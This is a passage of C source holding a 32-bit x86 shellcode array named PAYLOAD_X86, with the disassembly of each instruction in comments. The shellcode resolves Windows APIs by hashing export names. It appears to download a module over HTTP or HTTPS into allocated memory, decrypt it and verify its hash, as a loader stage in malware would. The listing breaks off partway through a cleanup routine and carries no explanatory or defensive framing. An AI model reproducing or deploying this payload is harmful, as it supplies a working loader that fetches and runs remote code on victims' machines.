
// Target architecture : X86 32

char PAYLOAD_X86[] = {
  /* 0000 */ "\x83\xec\x1c"                     /* sub       esp, 0x1c                           */
  /* 0003 */ "\x53"                             /* push      ebx                                 */
  /* 0004 */ "\x55"                             /* push      ebp                                 */
  /* 0005 */ "\x56"                             /* push      esi                                 */
  /* 0006 */ "\x8b\xf1"                         /* mov       esi, ecx                            */
  /* 0008 */ "\x57"                             /* push      edi                                 */
  /* 0009 */ "\x8b\x06"                         /* mov       eax, dword ptr [esi]                */
  /* 000B */ "\x8d\x6e\x24"                     /* lea       ebp, dword ptr [esi + 0x24]         */
  /* 000E */ "\x83\xe8\x24"                     /* sub       eax, 0x24                           */
  /* 0011 */ "\x8d\x56\x14"                     /* lea       edx, dword ptr [esi + 0x14]         */
  /* 0014 */ "\x50"                             /* push      eax                                 */
  /* 0015 */ "\x55"                             /* push      ebp                                 */
  /* 0016 */ "\x8d\x4e\x04"                     /* lea       ecx, dword ptr [esi + 4]            */
  /* 0019 */ "\xe8\x20\x09\x00\x00"             /* call      0x93e                               */
  /* 001E */ "\xff\xb6\x2c\x01\x00\x00"         /* push      dword ptr [esi + 0x12c]             */
  /* 0024 */ "\x8d\x8e\xac\x03\x00\x00"         /* lea       ecx, dword ptr [esi + 0x3ac]        */
  /* 002A */ "\xff\xb6\x28\x01\x00\x00"         /* push      dword ptr [esi + 0x128]             */
  /* 0030 */ "\xe8\xef\x07\x00\x00"             /* call      0x824                               */
  /* 0035 */ "\x3b\x86\xd0\x03\x00\x00"         /* cmp       eax, dword ptr [esi + 0x3d0]        */
  /* 003B */ "\x0f\x85\xd1\x00\x00\x00"         /* jne       0x112                               */
  /* 0041 */ "\x3b\x96\xd4\x03\x00\x00"         /* cmp       edx, dword ptr [esi + 0x3d4]        */
  /* 0047 */ "\x0f\x85\xc5\x00\x00\x00"         /* jne       0x112                               */
  /* 004D */ "\xff\xb6\x2c\x01\x00\x00"         /* push      dword ptr [esi + 0x12c]             */
  /* 0053 */ "\xff\xb6\x28\x01\x00\x00"         /* push      dword ptr [esi + 0x128]             */
  /* 0059 */ "\xff\xb6\x3c\x01\x00\x00"         /* push      dword ptr [esi + 0x13c]             */
  /* 005F */ "\xff\xb6\x38\x01\x00\x00"         /* push      dword ptr [esi + 0x138]             */
  /* 0065 */ "\xe8\x7d\x07\x00\x00"             /* call      0x7e7                               */
  /* 006A */ "\x89\x86\x38\x01\x00\x00"         /* mov       dword ptr [esi + 0x138], eax        */
  /* 0070 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0072 */ "\x0f\x84\x9a\x00\x00\x00"         /* je        0x112                               */
  /* 0078 */ "\x33\xff"                         /* xor       edi, edi                            */
  /* 007A */ "\x39\x7d\x00"                     /* cmp       dword ptr [ebp], edi                */
  /* 007D */ "\x76\x13"                         /* jbe       0x92                                */
  /* 007F */ "\x8d\x5e\x28"                     /* lea       ebx, dword ptr [esi + 0x28]         */
  /* 0082 */ "\x53"                             /* push      ebx                                 */
  /* 0083 */ "\xff\x96\x38\x01\x00\x00"         /* call      dword ptr [esi + 0x138]             */
  /* 0089 */ "\x47"                             /* inc       edi                                 */
  /* 008A */ "\x83\xc3\x20"                     /* add       ebx, 0x20                           */
  /* 008D */ "\x3b\x7d\x00"                     /* cmp       edi, dword ptr [ebp]                */
  /* 0090 */ "\x72\xf0"                         /* jb        0x82                                */
  /* 0092 */ "\x33\xdb"                         /* xor       ebx, ebx                            */
  /* 0094 */ "\x43"                             /* inc       ebx                                 */
  /* 0095 */ "\x39\x9e\x30\x01\x00\x00"         /* cmp       dword ptr [esi + 0x130], ebx        */
  /* 009B */ "\x76\x38"                         /* jbe       0xd5                                */
  /* 009D */ "\x8d\xae\x3c\x01\x00\x00"         /* lea       ebp, dword ptr [esi + 0x13c]        */
  /* 00A3 */ "\x8d\xbe\x40\x01\x00\x00"         /* lea       edi, dword ptr [esi + 0x140]        */
  /* 00A9 */ "\xff\xb6\x2c\x01\x00\x00"         /* push      dword ptr [esi + 0x12c]             */
  /* 00AF */ "\xff\xb6\x28\x01\x00\x00"         /* push      dword ptr [esi + 0x128]             */
  /* 00B5 */ "\xff\x77\x04"                     /* push      dword ptr [edi + 4]                 */
  /* 00B8 */ "\xff\x37"                         /* push      dword ptr [edi]                     */
  /* 00BA */ "\xe8\x28\x07\x00\x00"             /* call      0x7e7                               */
  /* 00BF */ "\x89\x45\x00"                     /* mov       dword ptr [ebp], eax                */
  /* 00C2 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 00C4 */ "\x74\x4c"                         /* je        0x112                               */
  /* 00C6 */ "\x43"                             /* inc       ebx                                 */
  /* 00C7 */ "\x83\xc7\x08"                     /* add       edi, 8                              */
  /* 00CA */ "\x83\xc5\x04"                     /* add       ebp, 4                              */
  /* 00CD */ "\x3b\x9e\x30\x01\x00\x00"         /* cmp       ebx, dword ptr [esi + 0x130]        */
  /* 00D3 */ "\x72\xd4"                         /* jb        0xa9                                */
  /* 00D5 */ "\x83\xbe\x18\x03\x00\x00\x01"     /* cmp       dword ptr [esi + 0x318], 1          */
  /* 00DC */ "\x75\x0b"                         /* jne       0xe9                                */
  /* 00DE */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 00E0 */ "\xe8\x38\x00\x00\x00"             /* call      0x11d                               */
  /* 00E5 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 00E7 */ "\x74\x29"                         /* je        0x112                               */
  /* 00E9 */ "\x8d\x54\x24\x10"                 /* lea       edx, dword ptr [esp + 0x10]         */
  /* 00ED */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 00EF */ "\xe8\xee\x03\x00\x00"             /* call      0x4e2                               */
  /* 00F4 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 00F6 */ "\x74\x0b"                         /* je        0x103                               */
  /* 00F8 */ "\x8d\x54\x24\x10"                 /* lea       edx, dword ptr [esp + 0x10]         */
  /* 00FC */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 00FE */ "\xe8\x8f\x05\x00\x00"             /* call      0x692                               */
  /* 0103 */ "\x8d\x54\x24\x10"                 /* lea       edx, dword ptr [esp + 0x10]         */
  /* 0107 */ "\x8b\xce"                         /* mov       ecx, esi                            */
  /* 0109 */ "\xe8\x2a\x03\x00\x00"             /* call      0x438                               */
  /* 010E */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 0110 */ "\xeb\x03"                         /* jmp       0x115                               */
  /* 0112 */ "\x83\xc8\xff"                     /* or        eax, 0xffffffff                     */
  /* 0115 */ "\x5f"                             /* pop       edi                                 */
  /* 0116 */ "\x5e"                             /* pop       esi                                 */
  /* 0117 */ "\x5d"                             /* pop       ebp                                 */
  /* 0118 */ "\x5b"                             /* pop       ebx                                 */
  /* 0119 */ "\x83\xc4\x1c"                     /* add       esp, 0x1c                           */
  /* 011C */ "\xc3"                             /* ret                                           */
  /* 011D */ "\x81\xec\x58\x01\x00\x00"         /* sub       esp, 0x158                          */
  /* 0123 */ "\x53"                             /* push      ebx                                 */
  /* 0124 */ "\x55"                             /* push      ebp                                 */
  /* 0125 */ "\x56"                             /* push      esi                                 */
  /* 0126 */ "\x57"                             /* push      edi                                 */
  /* 0127 */ "\x6a\x3c"                         /* push      0x3c                                */
  /* 0129 */ "\x5a"                             /* pop       edx                                 */
  /* 012A */ "\x32\xc0"                         /* xor       al, al                              */
  /* 012C */ "\x8d\x7c\x24\x2c"                 /* lea       edi, dword ptr [esp + 0x2c]         */
  /* 0130 */ "\x8b\xd9"                         /* mov       ebx, ecx                            */
  /* 0132 */ "\x33\xf6"                         /* xor       esi, esi                            */
  /* 0134 */ "\x8b\xca"                         /* mov       ecx, edx                            */
  /* 0136 */ "\x89\x74\x24\x18"                 /* mov       dword ptr [esp + 0x18], esi         */
  /* 013A */ "\xf3\xaa"                         /* rep stosb byte ptr es:[edi], al               */
  /* 013C */ "\x8d\x44\x24\x68"                 /* lea       eax, dword ptr [esp + 0x68]         */
  /* 0140 */ "\x89\x54\x24\x2c"                 /* mov       dword ptr [esp + 0x2c], edx         */
  /* 0144 */ "\x89\x44\x24\x3c"                 /* mov       dword ptr [esp + 0x3c], eax         */
  /* 0148 */ "\xbd\x00\x02\x60\x84"             /* mov       ebp, 0x84600200                     */
  /* 014D */ "\x8d\x84\x24\xe8\x00\x00\x00"     /* lea       eax, dword ptr [esp + 0xe8]         */
  /* 0154 */ "\x89\x44\x24\x58"                 /* mov       dword ptr [esp + 0x58], eax         */
  /* 0158 */ "\x8d\x42\x44"                     /* lea       eax, dword ptr [edx + 0x44]         */
  /* 015B */ "\x89\x44\x24\x40"                 /* mov       dword ptr [esp + 0x40], eax         */
  /* 015F */ "\x89\x44\x24\x5c"                 /* mov       dword ptr [esp + 0x5c], eax         */
  /* 0163 */ "\x8d\x44\x24\x2c"                 /* lea       eax, dword ptr [esp + 0x2c]         */
  /* 0167 */ "\x50"                             /* push      eax                                 */
  /* 0168 */ "\x68\x00\x00\x00\x10"             /* push      0x10000000                          */
  /* 016D */ "\x56"                             /* push      esi                                 */
  /* 016E */ "\x8d\x83\x1c\x03\x00\x00"         /* lea       eax, dword ptr [ebx + 0x31c]        */
  /* 0174 */ "\x50"                             /* push      eax                                 */
  /* 0175 */ "\xff\x93\x60\x01\x00\x00"         /* call      dword ptr [ebx + 0x160]             */
  /* 017B */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 017D */ "\x0f\x84\xbe\x01\x00\x00"         /* je        0x341                               */
  /* 0183 */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 0185 */ "\x83\x7c\x24\x38\x04"             /* cmp       dword ptr [esp + 0x38], 4           */
  /* 018A */ "\x56"                             /* push      esi                                 */
  /* 018B */ "\x56"                             /* push      esi                                 */
  /* 018C */ "\x0f\x94\xc0"                     /* sete      al                                  */
  /* 018F */ "\x56"                             /* push      esi                                 */
  /* 0190 */ "\x89\x44\x24\x20"                 /* mov       dword ptr [esp + 0x20], eax         */
  /* 0194 */ "\xb8\x00\x32\xe0\x84"             /* mov       eax, 0x84e03200                     */
  /* 0199 */ "\x56"                             /* push      esi                                 */
  /* 019A */ "\x0f\x44\xe8"                     /* cmove     ebp, eax                            */
  /* 019D */ "\x56"                             /* push      esi                                 */
  /* 019E */ "\x89\x6c\x24\x30"                 /* mov       dword ptr [esp + 0x30], ebp         */
  /* 01A2 */ "\xff\x93\x64\x01\x00\x00"         /* call      dword ptr [ebx + 0x164]             */
  /* 01A8 */ "\x8b\xc8"                         /* mov       ecx, eax                            */
  /* 01AA */ "\x89\x4c\x24\x28"                 /* mov       dword ptr [esp + 0x28], ecx         */
  /* 01AE */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 01B0 */ "\x0f\x84\x8b\x01\x00\x00"         /* je        0x341                               */
  /* 01B6 */ "\x8b\x7c\x24\x14"                 /* mov       edi, dword ptr [esp + 0x14]         */
  /* 01BA */ "\xba\xbb\x01\x00\x00"             /* mov       edx, 0x1bb                          */
  /* 01BF */ "\x56"                             /* push      esi                                 */
  /* 01C0 */ "\x56"                             /* push      esi                                 */
  /* 01C1 */ "\x6a\x03"                         /* push      3                                   */
  /* 01C3 */ "\x56"                             /* push      esi                                 */
  /* 01C4 */ "\x56"                             /* push      esi                                 */
  /* 01C5 */ "\x6a\x50"                         /* push      0x50                                */
  /* 01C7 */ "\x58"                             /* pop       eax                                 */
  /* 01C8 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 01CA */ "\x0f\x45\xc2"                     /* cmovne    eax, edx                            */
  /* 01CD */ "\x0f\xb7\xc0"                     /* movzx     eax, ax                             */
  /* 01D0 */ "\x50"                             /* push      eax                                 */
  /* 01D1 */ "\x8d\x84\x24\x80\x00\x00\x00"     /* lea       eax, dword ptr [esp + 0x80]         */
  /* 01D8 */ "\x50"                             /* push      eax                                 */
  /* 01D9 */ "\x51"                             /* push      ecx                                 */
  /* 01DA */ "\xff\x93\x68\x01\x00\x00"         /* call      dword ptr [ebx + 0x168]             */
  /* 01E0 */ "\x8b\xc8"                         /* mov       ecx, eax                            */
  /* 01E2 */ "\x89\x4c\x24\x14"                 /* mov       dword ptr [esp + 0x14], ecx         */
  /* 01E6 */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 01E8 */ "\x0f\x84\xfc\x00\x00\x00"         /* je        0x2ea                               */
  /* 01EE */ "\x56"                             /* push      esi                                 */
  /* 01EF */ "\x55"                             /* push      ebp                                 */
  /* 01F0 */ "\x56"                             /* push      esi                                 */
  /* 01F1 */ "\x56"                             /* push      esi                                 */
  /* 01F2 */ "\x56"                             /* push      esi                                 */
  /* 01F3 */ "\x8d\x84\x24\xfc\x00\x00\x00"     /* lea       eax, dword ptr [esp + 0xfc]         */
  /* 01FA */ "\x50"                             /* push      eax                                 */
  /* 01FB */ "\x8d\x83\x9c\x03\x00\x00"         /* lea       eax, dword ptr [ebx + 0x39c]        */
  /* 0201 */ "\x50"                             /* push      eax                                 */
  /* 0202 */ "\x51"                             /* push      ecx                                 */
  /* 0203 */ "\xff\x93\x78\x01\x00\x00"         /* call      dword ptr [ebx + 0x178]             */
  /* 0209 */ "\x8b\xe8"                         /* mov       ebp, eax                            */
  /* 020B */ "\x85\xed"                         /* test      ebp, ebp                            */
  /* 020D */ "\x0f\x84\xcd\x00\x00\x00"         /* je        0x2e0                               */
  /* 0213 */ "\x85\xff"                         /* test      edi, edi                            */
  /* 0215 */ "\x74\x22"                         /* je        0x239                               */
  /* 0217 */ "\xf7\x44\x24\x1c\x00\x10\x00\x00" /* test      dword ptr [esp + 0x1c], 0x1000      */
  /* 021F */ "\x74\x18"                         /* je        0x239                               */
  /* 0221 */ "\x6a\x04"                         /* push      4                                   */
  /* 0223 */ "\x8d\x44\x24\x24"                 /* lea       eax, dword ptr [esp + 0x24]         */
  /* 0227 */ "\xc7\x44\x24\x24\x80\x33\x00\x00" /* mov       dword ptr [esp + 0x24], 0x3380      */
  /* 022F */ "\x50"                             /* push      eax                                 */
  /* 0230 */ "\x6a\x1f"                         /* push      0x1f                                */
  /* 0232 */ "\x55"                             /* push      ebp                                 */
  /* 0233 */ "\xff\x93\x6c\x01\x00\x00"         /* call      dword ptr [ebx + 0x16c]             */
  /* 0239 */ "\x56"                             /* push      esi                                 */
  /* 023A */ "\x56"                             /* push      esi                                 */
  /* 023B */ "\x56"                             /* push      esi                                 */
  /* 023C */ "\x56"                             /* push      esi                                 */
  /* 023D */ "\x55"                             /* push      ebp                                 */
  /* 023E */ "\xff\x93\x7c\x01\x00\x00"         /* call      dword ptr [ebx + 0x17c]             */
  /* 0244 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0246 */ "\x0f\x84\x8d\x00\x00\x00"         /* je        0x2d9                               */
  /* 024C */ "\x56"                             /* push      esi                                 */
  /* 024D */ "\x8d\x44\x24\x14"                 /* lea       eax, dword ptr [esp + 0x14]         */
  /* 0251 */ "\xc7\x44\x24\x14\x04\x00\x00\x00" /* mov       dword ptr [esp + 0x14], 4           */
  /* 0259 */ "\x50"                             /* push      eax                                 */
  /* 025A */ "\x8d\x44\x24\x20"                 /* lea       eax, dword ptr [esp + 0x20]         */
  /* 025E */ "\x50"                             /* push      eax                                 */
  /* 025F */ "\x68\x13\x00\x00\x20"             /* push      0x20000013                          */
  /* 0264 */ "\x55"                             /* push      ebp                                 */
  /* 0265 */ "\xff\x93\x80\x01\x00\x00"         /* call      dword ptr [ebx + 0x180]             */
  /* 026B */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 026D */ "\x74\x6a"                         /* je        0x2d9                               */
  /* 026F */ "\x81\x7c\x24\x18\xc8\x00\x00\x00" /* cmp       dword ptr [esp + 0x18], 0xc8        */
  /* 0277 */ "\x75\x60"                         /* jne       0x2d9                               */
  /* 0279 */ "\x56"                             /* push      esi                                 */
  /* 027A */ "\x8d\x44\x24\x14"                 /* lea       eax, dword ptr [esp + 0x14]         */
  /* 027E */ "\xc7\x44\x24\x14\x04\x00\x00\x00" /* mov       dword ptr [esp + 0x14], 4           */
  /* 0286 */ "\x50"                             /* push      eax                                 */
  /* 0287 */ "\x8d\xbb\xf8\x03\x00\x00"         /* lea       edi, dword ptr [ebx + 0x3f8]        */
  /* 028D */ "\x57"                             /* push      edi                                 */
  /* 028E */ "\x68\x05\x00\x00\x20"             /* push      0x20000005                          */
  /* 0293 */ "\x55"                             /* push      ebp                                 */
  /* 0294 */ "\x89\x37"                         /* mov       dword ptr [edi], esi                */
  /* 0296 */ "\x89\x77\x04"                     /* mov       dword ptr [edi + 4], esi            */
  /* 0299 */ "\xff\x93\x80\x01\x00\x00"         /* call      dword ptr [ebx + 0x180]             */
  /* 029F */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 02A1 */ "\x74\x36"                         /* je        0x2d9                               */
  /* 02A3 */ "\x8b\x07"                         /* mov       eax, dword ptr [edi]                */
  /* 02A5 */ "\x0b\x47\x04"                     /* or        eax, dword ptr [edi + 4]            */
  /* 02A8 */ "\x74\x2f"                         /* je        0x2d9                               */
  /* 02AA */ "\x6a\x04"                         /* push      4                                   */
  /* 02AC */ "\x68\x00\x30\x00\x00"             /* push      0x3000                              */
  /* 02B1 */ "\xff\x37"                         /* push      dword ptr [edi]                     */
  /* 02B3 */ "\x56"                             /* push      esi                                 */
  /* 02B4 */ "\xff\x93\x3c\x01\x00\x00"         /* call      dword ptr [ebx + 0x13c]             */
  /* 02BA */ "\x89\x83\x00\x04\x00\x00"         /* mov       dword ptr [ebx + 0x400], eax        */
  /* 02C0 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 02C2 */ "\x74\x15"                         /* je        0x2d9                               */
  /* 02C4 */ "\x8d\x4c\x24\x24"                 /* lea       ecx, dword ptr [esp + 0x24]         */
  /* 02C8 */ "\x89\x74\x24\x24"                 /* mov       dword ptr [esp + 0x24], esi         */
  /* 02CC */ "\x51"                             /* push      ecx                                 */
  /* 02CD */ "\xff\x37"                         /* push      dword ptr [edi]                     */
  /* 02CF */ "\x50"                             /* push      eax                                 */
  /* 02D0 */ "\x55"                             /* push      ebp                                 */
  /* 02D1 */ "\xff\x93\x70\x01\x00\x00"         /* call      dword ptr [ebx + 0x170]             */
  /* 02D7 */ "\x8b\xf0"                         /* mov       esi, eax                            */
  /* 02D9 */ "\x55"                             /* push      ebp                                 */
  /* 02DA */ "\xff\x93\x74\x01\x00\x00"         /* call      dword ptr [ebx + 0x174]             */
  /* 02E0 */ "\xff\x74\x24\x14"                 /* push      dword ptr [esp + 0x14]              */
  /* 02E4 */ "\xff\x93\x74\x01\x00\x00"         /* call      dword ptr [ebx + 0x174]             */
  /* 02EA */ "\xff\x74\x24\x28"                 /* push      dword ptr [esp + 0x28]              */
  /* 02EE */ "\xff\x93\x74\x01\x00\x00"         /* call      dword ptr [ebx + 0x174]             */
  /* 02F4 */ "\x85\xf6"                         /* test      esi, esi                            */
  /* 02F6 */ "\x74\x45"                         /* je        0x33d                               */
  /* 02F8 */ "\xff\xb3\xf8\x03\x00\x00"         /* push      dword ptr [ebx + 0x3f8]             */
  /* 02FE */ "\x8b\xbb\x00\x04\x00\x00"         /* mov       edi, dword ptr [ebx + 0x400]        */
  /* 0304 */ "\x8d\x93\xe8\x03\x00\x00"         /* lea       edx, dword ptr [ebx + 0x3e8]        */
  /* 030A */ "\x57"                             /* push      edi                                 */
  /* 030B */ "\x8d\x8b\xd8\x03\x00\x00"         /* lea       ecx, dword ptr [ebx + 0x3d8]        */
  /* 0311 */ "\xe8\x28\x06\x00\x00"             /* call      0x93e                               */
  /* 0316 */ "\xff\xb3\x2c\x01\x00\x00"         /* push      dword ptr [ebx + 0x12c]             */
  /* 031C */ "\x8d\x8b\xac\x03\x00\x00"         /* lea       ecx, dword ptr [ebx + 0x3ac]        */
  /* 0322 */ "\xff\xb3\x28\x01\x00\x00"         /* push      dword ptr [ebx + 0x128]             */
  /* 0328 */ "\xe8\xf7\x04\x00\x00"             /* call      0x824                               */
  /* 032D */ "\x3b\x87\x28\x03\x00\x00"         /* cmp       eax, dword ptr [edi + 0x328]        */
  /* 0333 */ "\x75\x0c"                         /* jne       0x341                               */
  /* 0335 */ "\x3b\x97\x2c\x03\x00\x00"         /* cmp       edx, dword ptr [edi + 0x32c]        */
  /* 033B */ "\x75\x04"                         /* jne       0x341                               */
  /* 033D */ "\x8b\xc6"                         /* mov       eax, esi                            */
  /* 033F */ "\xeb\x02"                         /* jmp       0x343                               */
  /* 0341 */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 0343 */ "\x5f"                             /* pop       edi                                 */
  /* 0344 */ "\x5e"                             /* pop       esi                                 */
  /* 0345 */ "\x5d"                             /* pop       ebp                                 */
  /* 0346 */ "\x5b"                             /* pop       ebx                                 */
  /* 0347 */ "\x81\xc4\x58\x01\x00\x00"         /* add       esp, 0x158                          */
  /* 034D */ "\xc3"                             /* ret                                           */
  /* 034E */ "\x81\xec\x14\x01\x00\x00"         /* sub       esp, 0x114                          */
  /* 0354 */ "\x53"                             /* push      ebx                                 */
  /* 0355 */ "\x55"                             /* push      ebp                                 */
  /* 0356 */ "\x56"                             /* push      esi                                 */
  /* 0357 */ "\x8b\xf1"                         /* mov       esi, ecx                            */
  /* 0359 */ "\x57"                             /* push      edi                                 */
  /* 035A */ "\x8b\x46\x3c"                     /* mov       eax, dword ptr [esi + 0x3c]         */
  /* 035D */ "\x8b\x44\x30\x78"                 /* mov       eax, dword ptr [eax + esi + 0x78]   */
  /* 0361 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0363 */ "\x0f\x84\xaf\x00\x00\x00"         /* je        0x418                               */
  /* 0369 */ "\x8b\x7c\x30\x18"                 /* mov       edi, dword ptr [eax + esi + 0x18]   */
  /* 036D */ "\x85\xff"                         /* test      edi, edi                            */
  /* 036F */ "\x0f\x84\xa3\x00\x00\x00"         /* je        0x418                               */
  /* 0375 */ "\x8b\x4c\x30\x20"                 /* mov       ecx, dword ptr [eax + esi + 0x20]   */
  /* 0379 */ "\x33\xdb"                         /* xor       ebx, ebx                            */
  /* 037B */ "\x8b\x6c\x30\x1c"                 /* mov       ebp, dword ptr [eax + esi + 0x1c]   */
  /* 037F */ "\x03\xce"                         /* add       ecx, esi                            */
  /* 0381 */ "\x89\x4c\x24\x10"                 /* mov       dword ptr [esp + 0x10], ecx         */
  /* 0385 */ "\x03\xee"                         /* add       ebp, esi                            */
  /* 0387 */ "\x8b\x4c\x30\x24"                 /* mov       ecx, dword ptr [eax + esi + 0x24]   */
  /* 038B */ "\x8b\x44\x30\x0c"                 /* mov       eax, dword ptr [eax + esi + 0xc]    */
  /* 038F */ "\x03\xce"                         /* add       ecx, esi                            */
  /* 0391 */ "\x03\xc6"                         /* add       eax, esi                            */
  /* 0393 */ "\x89\x4c\x24\x1c"                 /* mov       dword ptr [esp + 0x1c], ecx         */
  /* 0397 */ "\x8a\x08"                         /* mov       cl, byte ptr [eax]                  */
  /* 0399 */ "\x84\xc9"                         /* test      cl, cl                              */
  /* 039B */ "\x74\x14"                         /* je        0x3b1                               */
  /* 039D */ "\x8d\x54\x24\x20"                 /* lea       edx, dword ptr [esp + 0x20]         */
  /* 03A1 */ "\x2b\xd0"                         /* sub       edx, eax                            */
  /* 03A3 */ "\x80\xc9\x20"                     /* or        cl, 0x20                            */
  /* 03A6 */ "\x43"                             /* inc       ebx                                 */
  /* 03A7 */ "\x88\x0c\x02"                     /* mov       byte ptr [edx + eax], cl            */
  /* 03AA */ "\x40"                             /* inc       eax                                 */
  /* 03AB */ "\x8a\x08"                         /* mov       cl, byte ptr [eax]                  */
  /* 03AD */ "\x84\xc9"                         /* test      cl, cl                              */
  /* 03AF */ "\x75\xf2"                         /* jne       0x3a3                               */
  /* 03B1 */ "\xff\xb4\x24\x34\x01\x00\x00"     /* push      dword ptr [esp + 0x134]             */
  /* 03B8 */ "\x8d\x4c\x24\x24"                 /* lea       ecx, dword ptr [esp + 0x24]         */
  /* 03BC */ "\xc6\x44\x1c\x24\x00"             /* mov       byte ptr [esp + ebx + 0x24], 0      */
  /* 03C1 */ "\xff\xb4\x24\x34\x01\x00\x00"     /* push      dword ptr [esp + 0x134]             */
  /* 03C8 */ "\xe8\x57\x04\x00\x00"             /* call      0x824                               */
  /* 03CD */ "\x8b\x5c\x24\x10"                 /* mov       ebx, dword ptr [esp + 0x10]         */
  /* 03D1 */ "\x83\xc3\xfc"                     /* add       ebx, -4                             */
  /* 03D4 */ "\x89\x44\x24\x14"                 /* mov       dword ptr [esp + 0x14], eax         */
  /* 03D8 */ "\x89\x54\x24\x18"                 /* mov       dword ptr [esp + 0x18], edx         */
  /* 03DC */ "\x8d\x1c\xbb"                     /* lea       ebx, dword ptr [ebx + edi*4]        */
  /* 03DF */ "\xff\xb4\x24\x34\x01\x00\x00"     /* push      dword ptr [esp + 0x134]             */
  /* 03E6 */ "\x8b\x0b"                         /* mov       ecx, dword ptr [ebx]                */
  /* 03E8 */ "\xff\xb4\x24\x34\x01\x00\x00"     /* push      dword ptr [esp + 0x134]             */
  /* 03EF */ "\x03\xce"                         /* add       ecx, esi                            */
  /* 03F1 */ "\xe8\x2e\x04\x00\x00"             /* call      0x824                               */
  /* 03F6 */ "\x33\x44\x24\x14"                 /* xor       eax, dword ptr [esp + 0x14]         */
  /* 03FA */ "\x33\x54\x24\x18"                 /* xor       edx, dword ptr [esp + 0x18]         */
  /* 03FE */ "\x3b\x84\x24\x28\x01\x00\x00"     /* cmp       eax, dword ptr [esp + 0x128]        */
  /* 0405 */ "\x75\x09"                         /* jne       0x410                               */
  /* 0407 */ "\x3b\x94\x24\x2c\x01\x00\x00"     /* cmp       edx, dword ptr [esp + 0x12c]        */
  /* 040E */ "\x74\x17"                         /* je        0x427                               */
  /* 0410 */ "\x83\xeb\x04"                     /* sub       ebx, 4                              */
  /* 0413 */ "\x83\xef\x01"                     /* sub       edi, 1                              */
  /* 0416 */ "\x75\xc7"                         /* jne       0x3df                               */
  /* 0418 */ "\x33\xc0"                         /* xor       eax, eax                            */
  /* 041A */ "\x5f"                             /* pop       edi                                 */
  /* 041B */ "\x5e"                             /* pop       esi                                 */
  /* 041C */ "\x5d"                             /* pop       ebp                                 */
  /* 041D */ "\x5b"                             /* pop       ebx                                 */
  /* 041E */ "\x81\xc4\x14\x01\x00\x00"         /* add       esp, 0x114                          */
  /* 0424 */ "\xc2\x10\x00"                     /* ret       0x10                                */
  /* 0427 */ "\x8b\x44\x24\x1c"                 /* mov       eax, dword ptr [esp + 0x1c]         */
  /* 042B */ "\x0f\xb7\x44\x78\xfe"             /* movzx     eax, word ptr [eax + edi*2 - 2]     */
  /* 0430 */ "\x8b\x44\x85\x00"                 /* mov       eax, dword ptr [ebp + eax*4]        */
  /* 0434 */ "\x03\xc6"                         /* add       eax, esi                            */
  /* 0436 */ "\xeb\xe2"                         /* jmp       0x41a                               */
  /* 0438 */ "\x53"                             /* push      ebx                                 */
  /* 0439 */ "\x56"                             /* push      esi                                 */
  /* 043A */ "\x57"                             /* push      edi                                 */
  /* 043B */ "\x8b\xf9"                         /* mov       edi, ecx                            */
  /* 043D */ "\x33\xdb"                         /* xor       ebx, ebx                            */
  /* 043F */ "\x8b\xf2"                         /* mov       esi, edx                            */
  /* 0441 */ "\x83\xbf\x18\x03\x00\x00\x01"     /* cmp       dword ptr [edi + 0x318], 1          */
  /* 0448 */ "\x75\x1d"                         /* jne       0x467                               */
  /* 044A */ "\x8b\x87\x00\x04\x00\x00"         /* mov       eax, dword ptr [edi + 0x400]        */
  /* 0450 */ "\x85\xc0"                         /* test      eax, eax                            */
  /* 0452 */ "\x74\x13"                         /* je        0x467                               */
  /* 0454 */ "\x68\x00\xc0\x00\x00"             /* push      0xc000                              */
  /* 0459 */ "\x53"                             /* push      ebx                                 */
  /* 045A */ "\x50"                             /* push      eax                                 */
  /* 045B */ "\xff\x97\x40\x01\x00\x00"         /* call      dword ptr [edi + 0x140]             */
  /* 0461 */ "\x89\x9f\x00\x04\x00\x00"         /* mov       dword ptr [edi + 0x400], ebx        */
  /* 0467 */ "\x8b\x4e\x18"                     /* mov       ecx, dword ptr [esi + 0x18]         */
  /* 046A */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 046C */ "\x74\x09"                         /* je        0x477                               */
  /* 046E */ "\x8b\x01"                         /* mov       eax, dword ptr [ecx]                */
  /* 0470 */ "\x51"                             /* push      ecx                                 */
  /* 0471 */ "\xff\x50\x08"                     /* call      dword ptr [eax + 8]                 */
  /* 0474 */ "\x89\x5e\x18"                     /* mov       dword ptr [esi + 0x18], ebx         */
  /* 0477 */ "\x8b\x4e\x14"                     /* mov       ecx, dword ptr [esi + 0x14]         */
  /* 047A */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 047C */ "\x74\x09"                         /* je        0x487                               */
  /* 047E */ "\x8b\x01"                         /* mov       eax, dword ptr [ecx]                */
  /* 0480 */ "\x51"                             /* push      ecx                                 */
  /* 0481 */ "\xff\x50\x08"                     /* call      dword ptr [eax + 8]                 */
  /* 0484 */ "\x89\x5e\x14"                     /* mov       dword ptr [esi + 0x14], ebx         */
  /* 0487 */ "\x8b\x4e\x10"                     /* mov       ecx, dword ptr [esi + 0x10]         */
  /* 048A */ "\x85\xc9"                         /* test      ecx, ecx                            */
  /* 048C */ "\x74\x09"                         /* je        0x497                               */
  /* 048E */ "\x8b\x01"                         /* mov       eax, dword ptr [ecx]                */
  /* 0490 */ "\x51"                             /* push      ecx                                 */
  /* 0491 */ "\xff\x50\x08"                     /* call      dword ptr [eax + 8]                 */
  /* 0494 */ "\x89\x5e\x10"                     /* mov       dword ptr [esi + 0x10], ebx         */
